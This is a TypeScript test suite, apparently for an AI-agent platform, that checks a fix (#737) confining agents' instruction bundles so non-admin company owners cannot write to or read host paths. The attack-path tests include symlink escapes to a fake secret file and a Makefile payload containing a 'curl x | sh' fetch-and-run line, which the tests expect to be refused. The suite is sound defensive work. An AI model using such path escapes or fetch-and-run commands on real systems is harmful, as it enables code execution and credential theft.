import { randomUUID } from "node:crypto";
import fs from "node:fs/promises";
import os from "node:os";
import path from "node:path";
import express from "express";
import request from "supertest";
import { eq, sql } from "drizzle-orm";
import { afterAll, afterEach, beforeAll, beforeEach, describe, expect, it } from "vitest";
import {
  agents,
  authUsers,
  companies,
  companyMemberships,
  createDb,
} from "@paperclipai/db";
import {
  getEmbeddedPostgresTestSupport,
  startEmbeddedPostgresTestDatabase,
} from "./helpers/embedded-postgres.js";
import { errorHandler } from "../middleware/index.js";
import { agentRoutes } from "../routes/agents.js";
import { agentProfileName } from "../services/hermes-profile.js";
import { truncateWithRetry } from "./helpers/truncate.js";

const embeddedPostgresSupport = await getEmbeddedPostgresTestSupport();
const describeEmbeddedPostgres = embeddedPostgresSupport.supported ? describe : describe.skip;

type TestDb = ReturnType<typeof createDb>;

/**
 * AgentDash (security, #737). A company owner who is not instance admin could
 * switch an agent's instructions bundle to an external root at any host path
 * and then write files into it (the launchd env file, ~/.ssh, ~/.hermes), or
 * read any host file back through the bundle file route. These tests run the
 * real routes and the real instructions service against embedded Postgres and
 * a temporary instance home, and check the host filesystem afterwards.
 */
describeEmbeddedPostgres("instructions bundle confinement (#737)", () => {
  let db!: TestDb;
  let tempDb: Awaited<ReturnType<typeof startEmbeddedPostgresTestDatabase>> | null = null;
  let scratch = "";
  let instanceRoot = "";
  let hostDir = "";
  const savedEnv: Record<string, string | undefined> = {};
  const ENV_KEYS = [
    "PAPERCLIP_HOME",
    "PAPERCLIP_INSTANCE_ID",
    "AGENTDASH_HERMES_MANAGED_PROFILES",
    "AGENTDASH_DEPLOYMENT_KIND",
    "AGENTDASH_HERMES_ROOT",
    "AGENTDASH_HERMES_BIN_DIR",
  ];

  beforeAll(async () => {
    tempDb = await startEmbeddedPostgresTestDatabase("paperclip-instructions-confinement-");
    db = createDb(tempDb.connectionString);
  }, 20_000);

  beforeEach(async () => {
    for (const key of ENV_KEYS) savedEnv[key] = process.env[key];
    scratch = await fs.realpath(await fs.mkdtemp(path.join(os.tmpdir(), "instructions-confinement-")));
    process.env.PAPERCLIP_HOME = path.join(scratch, "paperclip");
    process.env.PAPERCLIP_INSTANCE_ID = "confinement";
    delete process.env.AGENTDASH_HERMES_MANAGED_PROFILES;
    delete process.env.AGENTDASH_DEPLOYMENT_KIND;
    // The hosted image keeps every profile .env and per-agent wrapper here.
    process.env.AGENTDASH_HERMES_ROOT = path.join(scratch, "hermes-root");
    process.env.AGENTDASH_HERMES_BIN_DIR = path.join(scratch, "hermes-root", "bin");
    instanceRoot = path.join(scratch, "paperclip", "instances", "confinement");
    // Stands in for ~/.config/agentdash, ~/.ssh or ~/.hermes: a host
    // directory outside the instance home.
    hostDir = path.join(scratch, "host-config");
    await fs.mkdir(hostDir, { recursive: true });
    await fs.writeFile(path.join(hostDir, "secret.env"), "PROVIDER_KEY=sk-live-host\n", "utf8");
  });

  afterEach(async () => {
    for (const key of ENV_KEYS) {
      if (savedEnv[key] === undefined) delete process.env[key];
      else process.env[key] = savedEnv[key];
    }
    await fs.rm(scratch, { recursive: true, force: true });
    await truncateWithRetry(db, sql`${companies}, ${authUsers}`);
  });

  afterAll(async () => {
    await tempDb?.cleanup();
  });

  async function seed() {
    const company = await db
      .insert(companies)
      .values({ name: `Confine ${randomUUID()}`, issuePrefix: `CF${randomUUID().slice(0, 6).toUpperCase()}` })
      .returning()
      .then((rows) => rows[0]!);
    const ownerUserId = randomUUID();
    const now = new Date();
    await db.insert(authUsers).values({
      id: ownerUserId,
      name: "Company Owner",
      email: `${ownerUserId}@example.test`,
      createdAt: now,
      updatedAt: now,
    });
    await db.insert(companyMemberships).values({
      companyId: company.id,
      principalType: "user",
      principalId: ownerUserId,
      status: "active",
      membershipRole: "admin",
    });
    const agent = await createAgent(company.id, "Worker");
    return { company, ownerUserId, agent };
  }

  async function createAgent(companyId: string, name: string, adapterConfig: Record<string, unknown> = {}) {
    return db
      .insert(agents)
      .values({
        companyId,
        name,
        role: "engineer",
        status: "idle",
        adapterType: "hermes_local",
        adapterConfig,
      })
      .returning()
      .then((rows) => rows[0]!);
  }

  function owner(companyId: string, userId: string) {
    return {
      type: "board",
      userId,
      source: "session",
      isInstanceAdmin: false,
      companyIds: [companyId],
      memberships: [{ companyId, membershipRole: "admin", status: "active" }],
    };
  }

  function instanceAdmin(companyId: string, userId: string) {
    return { ...owner(companyId, userId), isInstanceAdmin: true };
  }

  function createApp(actor: Record<string, unknown>) {
    const app = express();
    app.use(express.json());
    app.use((req, _res, next) => {
      (req as any).actor = { ...actor };
      next();
    });
    app.use("/api", agentRoutes(db));
    app.use(errorHandler);
    return app;
  }

  async function send(actor: Record<string, unknown>, build: (agent: request.Agent) => request.Test) {
    const { createServer } = await import("node:http");
    const server = createServer(createApp(actor));
    try {
      await new Promise<void>((resolve) => server.listen(0, "127.0.0.1", resolve));
      const address = server.address();
      if (!address || typeof address === "string") throw new Error("no port");
      return await build(request.agent(`http://127.0.0.1:${address.port}`));
    } finally {
      await new Promise<void>((resolve, reject) => server.close((e) => (e ? reject(e) : resolve())));
    }
  }

  async function readAgent(id: string) {
    return db.select().from(agents).where(eq(agents.id, id)).then((rows) => rows[0]!);
  }

  async function exists(target: string) {
    return fs.lstat(target).then(() => true, () => false);
  }

  function sharedRoot(companyId: string, ...rest: string[]) {
    return path.join(instanceRoot, "companies", companyId, "shared-instructions", ...rest);
  }

  describe("attack paths: a company owner who is not instance admin", () => {
    it("cannot point the bundle at a host directory and write into it", async () => {
      const { company, ownerUserId, agent } = await seed();
      const before = await readAgent(agent.id);

      const res = await send(owner(company.id, ownerUserId), (r) =>
        r.patch(`/api/agents/${agent.id}/instructions-bundle`).send({ mode: "external", rootPath: hostDir }));

      expect(res.status, JSON.stringify(res.body)).toBe(403);
      expect(res.body.error).toContain("Instance admin access required");
      expect(await fs.readdir(hostDir)).toEqual(["secret.env"]);
      expect((await readAgent(agent.id)).adapterConfig).toEqual(before.adapterConfig);
    });

    it("cannot point the instructions path at a host file", async () => {
      const { company, ownerUserId, agent } = await seed();

      const res = await send(owner(company.id, ownerUserId), (r) =>
        r.patch(`/api/agents/${agent.id}/instructions-path`).send({ path: path.join(hostDir, "secret.env") }));

      expect(res.status, JSON.stringify(res.body)).toBe(403);
      expect((await readAgent(agent.id)).adapterConfig).toEqual({});
    });

    it("cannot set instructionsRootPath or instructionsFilePath through the agent PATCH", async () => {
      const { company, ownerUserId, agent } = await seed();

      const res = await send(owner(company.id, ownerUserId), (r) =>
        r.patch(`/api/agents/${agent.id}`).send({
          adapterConfig: {
            instructionsBundleMode: "external",
            instructionsRootPath: hostDir,
            instructionsFilePath: path.join(hostDir, "secret.env"),
          },
        }));

      expect(res.status, JSON.stringify(res.body)).toBe(403);
      expect(res.body.error).toContain("adapterConfig.instructionsRootPath");
      expect(res.body.error).toContain("adapterConfig.instructionsFilePath");
      expect((await readAgent(agent.id)).adapterConfig).toEqual({});
    });

    it("cannot create an agent whose instructions file is a host file", async () => {
      const { company, ownerUserId } = await seed();

      const res = await send(owner(company.id, ownerUserId), (r) =>
        r.post(`/api/companies/${company.id}/agents`).send({
          name: "Reader",
          role: "engineer",
          adapterType: "hermes_local",
          adapterConfig: { instructionsFilePath: path.join(hostDir, "secret.env") },
        }));

      expect(res.status, JSON.stringify(res.body)).toBe(403);
      expect(res.body.error).toContain("adapterConfig.instructionsFilePath");
    });

    it("cannot reach a host directory through a symlink planted in the company's shared directory", async () => {
      const { company, ownerUserId, agent } = await seed();
      await fs.mkdir(sharedRoot(company.id), { recursive: true });
      await fs.symlink(hostDir, sharedRoot(company.id, "linked"));

      const res = await send(owner(company.id, ownerUserId), (r) =>
        r.patch(`/api/agents/${agent.id}/instructions-bundle`).send({
          mode: "external",
          rootPath: sharedRoot(company.id, "linked"),
        }));

      expect(res.status, JSON.stringify(res.body)).toBe(403);
      expect(res.body.error).toContain("symbolic link");
      expect(await fs.readdir(hostDir)).toEqual(["secret.env"]);
    });

    it("cannot write into an external root an instance admin chose outside the company directory", async () => {
      const { company, ownerUserId } = await seed();
      const adminRoot = path.join(scratch, "checkout");
      await fs.mkdir(adminRoot, { recursive: true });
      await fs.writeFile(path.join(adminRoot, "AGENTS.md"), "# Admin bundle\n", "utf8");
      const agent = await createAgent(company.id, "Admin bundle", {
        instructionsBundleMode: "external",
        instructionsRootPath: adminRoot,
        instructionsEntryFile: "AGENTS.md",
        instructionsFilePath: path.join(adminRoot, "AGENTS.md"),
      });

      const res = await send(owner(company.id, ownerUserId), (r) =>
        r.put(`/api/agents/${agent.id}/instructions-bundle/file`).send({ path: "Makefile", content: "all:\n\tcurl x | sh\n" }));

      expect(res.status, JSON.stringify(res.body)).toBe(403);
      expect(await exists(path.join(adminRoot, "Makefile"))).toBe(false);
    });

    it("cannot use -p with a Hermes profile that is not provisioned for this company (managed profiles)", async () => {
      process.env.AGENTDASH_HERMES_MANAGED_PROFILES = "true";
      const { company, ownerUserId, agent } = await seed();
      const otherCompany = await db
        .insert(companies)
        .values({ name: `Other ${randomUUID()}`, issuePrefix: `OT${randomUUID().slice(0, 6).toUpperCase()}` })
        .returning()
        .then((rows) => rows[0]!);
      const foreignAgent = await createAgent(otherCompany.id, "Foreign");

      for (const profile of ["ccworker", "default", agentProfileName(foreignAgent.id)]) {
        const res = await send(owner(company.id, ownerUserId), (r) =>
          r.patch(`/api/agents/${agent.id}`).send({ adapterConfig: { extraArgs: ["-p", profile] } }));
        expect(res.status, `${profile}: ${JSON.stringify(res.body)}`).toBe(403);
        expect(res.body.error).toContain("adapterConfig.extraArgs");
      }
      expect((await readAgent(agent.id)).adapterConfig).toEqual({});
    });

    it("cannot root a bundle over the Hermes profiles or wrapper directory, even as instance admin", async () => {
      const { company, ownerUserId, agent } = await seed();
      const hermesRoot = path.join(scratch, "hermes-root");
      await fs.mkdir(path.join(hermesRoot, "bin"), { recursive: true });

      for (const rootPath of [hermesRoot, path.join(hermesRoot, "bin"), scratch]) {
        const res = await send(instanceAdmin(company.id, ownerUserId), (r) =>
          r.patch(`/api/agents/${agent.id}/instructions-bundle`).send({ mode: "external", rootPath }));
        expect(res.status, `${rootPath}: ${JSON.stringify(res.body)}`).toBe(422);
        expect(res.body.error).toContain("protected host directory");
      }
      expect(await fs.readdir(path.join(hermesRoot, "bin"))).toEqual([]);

      const pathRes = await send(instanceAdmin(company.id, ownerUserId), (r) =>
        r.patch(`/api/agents/${agent.id}/instructions-path`).send({ path: path.join(hermesRoot, "bin", "wrapper") }));
      expect(pathRes.status, JSON.stringify(pathRes.body)).toBe(422);
    });

    it("cannot read a host file through a symlink inside the bundle root", async () => {
      const { company, ownerUserId, agent } = await seed();
      const managedRoot = path.join(instanceRoot, "companies", company.id, "agents", agent.id, "instructions");
      await fs.mkdir(managedRoot, { recursive: true });
      await fs.writeFile(path.join(managedRoot, "AGENTS.md"), "# Worker\n", "utf8");
      await fs.symlink(path.join(hostDir, "secret.env"), path.join(managedRoot, "leak.md"));

      const read = await send(owner(company.id, ownerUserId), (r) =>
        r.get(`/api/agents/${agent.id}/instructions-bundle/file`).query({ path: "leak.md" }));
      expect(read.status, JSON.stringify(read.body)).toBe(422);
      expect(JSON.stringify(read.body)).not.toContain("sk-live-host");

      const write = await send(owner(company.id, ownerUserId), (r) =>
        r.put(`/api/agents/${agent.id}/instructions-bundle/file`).send({ path: "leak.md", content: "overwritten" }));
      expect(write.status, JSON.stringify(write.body)).toBe(422);
      expect(await fs.readFile(path.join(hostDir, "secret.env"), "utf8")).toBe("PROVIDER_KEY=sk-live-host\n");
    });
  });

  describe("legitimate paths", () => {
    it("lets a company owner use an external bundle in the company's shared directory", async () => {
      const { company, ownerUserId, agent } = await seed();
      const root = sharedRoot(company.id, "team");

      const patch = await send(owner(company.id, ownerUserId), (r) =>
        r.patch(`/api/agents/${agent.id}/instructions-bundle`).send({ mode: "external", rootPath: root }));
      expect(patch.status, JSON.stringify(patch.body)).toBe(200);
      expect(patch.body.rootPath).toBe(root);

      const put = await send(owner(company.id, ownerUserId), (r) =>
        r.put(`/api/agents/${agent.id}/instructions-bundle/file`).send({ path: "AGENTS.md", content: "# Team\n" }));
      expect(put.status, JSON.stringify(put.body)).toBe(200);
      expect(await fs.readFile(path.join(root, "AGENTS.md"), "utf8")).toBe("# Team\n");

      const get = await send(owner(company.id, ownerUserId), (r) =>
        r.get(`/api/agents/${agent.id}/instructions-bundle/file`).query({ path: "AGENTS.md" }));
      expect(get.status, JSON.stringify(get.body)).toBe(200);
      expect(get.body.content).toBe("# Team\n");
    });

    it("lets a company owner edit the managed bundle and point the path inside it", async () => {
      const { company, ownerUserId, agent } = await seed();
      const managedEntry = path.join(instanceRoot, "companies", company.id, "agents", agent.id, "instructions", "AGENTS.md");

      const put = await send(owner(company.id, ownerUserId), (r) =>
        r.put(`/api/agents/${agent.id}/instructions-bundle/file`).send({ path: "AGENTS.md", content: "# Managed\n" }));
      expect(put.status, JSON.stringify(put.body)).toBe(200);
      expect(await fs.readFile(managedEntry, "utf8")).toBe("# Managed\n");

      const pathRes = await send(owner(company.id, ownerUserId), (r) =>
        r.patch(`/api/agents/${agent.id}/instructions-path`).send({ path: managedEntry }));
      expect(pathRes.status, JSON.stringify(pathRes.body)).toBe(200);
      expect(pathRes.body.path).toBe(managedEntry);

      // The edit form resends the stored config: unchanged *Path values pass.
      const stored = (await readAgent(agent.id)).adapterConfig as Record<string, unknown>;
      const resend = await send(owner(company.id, ownerUserId), (r) =>
        r.patch(`/api/agents/${agent.id}`).send({ adapterConfig: stored }));
      expect(resend.status, JSON.stringify(resend.body)).toBe(200);
    });

    it("lets an instance admin choose any external root and edit it", async () => {
      const { company, ownerUserId, agent } = await seed();
      const adminRoot = path.join(scratch, "checkout");

      const patch = await send(instanceAdmin(company.id, ownerUserId), (r) =>
        r.patch(`/api/agents/${agent.id}/instructions-bundle`).send({ mode: "external", rootPath: adminRoot }));
      expect(patch.status, JSON.stringify(patch.body)).toBe(200);

      const put = await send(instanceAdmin(company.id, ownerUserId), (r) =>
        r.put(`/api/agents/${agent.id}/instructions-bundle/file`).send({ path: "AGENTS.md", content: "# Admin\n" }));
      expect(put.status, JSON.stringify(put.body)).toBe(200);
      expect(await fs.readFile(path.join(adminRoot, "AGENTS.md"), "utf8")).toBe("# Admin\n");
    });

    it("lets a company owner pick the agent's own profile, and only that (managed profiles)", async () => {
      process.env.AGENTDASH_HERMES_MANAGED_PROFILES = "true";
      const { company, ownerUserId, agent } = await seed();
      const teammate = await createAgent(company.id, "Teammate");

      const own = await send(owner(company.id, ownerUserId), (r) =>
        r.patch(`/api/agents/${agent.id}`).send({
          adapterConfig: { extraArgs: ["-p", agentProfileName(agent.id), "--reasoning-effort", "high"] },
        }));
      expect(own.status, JSON.stringify(own.body)).toBe(200);

      // A teammate's profile is in the same company, but the run keeps only the
      // agent's own profile (registry.ts), so the write-time gate refuses it
      // rather than store a flag every run would drop.
      const sibling = await send(owner(company.id, ownerUserId), (r) =>
        r.patch(`/api/agents/${agent.id}`).send({
          adapterConfig: { extraArgs: ["-p", agentProfileName(teammate.id), "--reasoning-effort", "high"] },
        }));
      expect(sibling.status, JSON.stringify(sibling.body)).toBe(403);
    });

    it("keeps any valid -p profile open when managed profiles are off (local dev, self-hosted)", async () => {
      const { company, ownerUserId, agent } = await seed();

      const res = await send(owner(company.id, ownerUserId), (r) =>
        r.patch(`/api/agents/${agent.id}`).send({ adapterConfig: { extraArgs: ["-p", "agentdash"] } }));
      expect(res.status, JSON.stringify(res.body)).toBe(200);
    });
  });
});
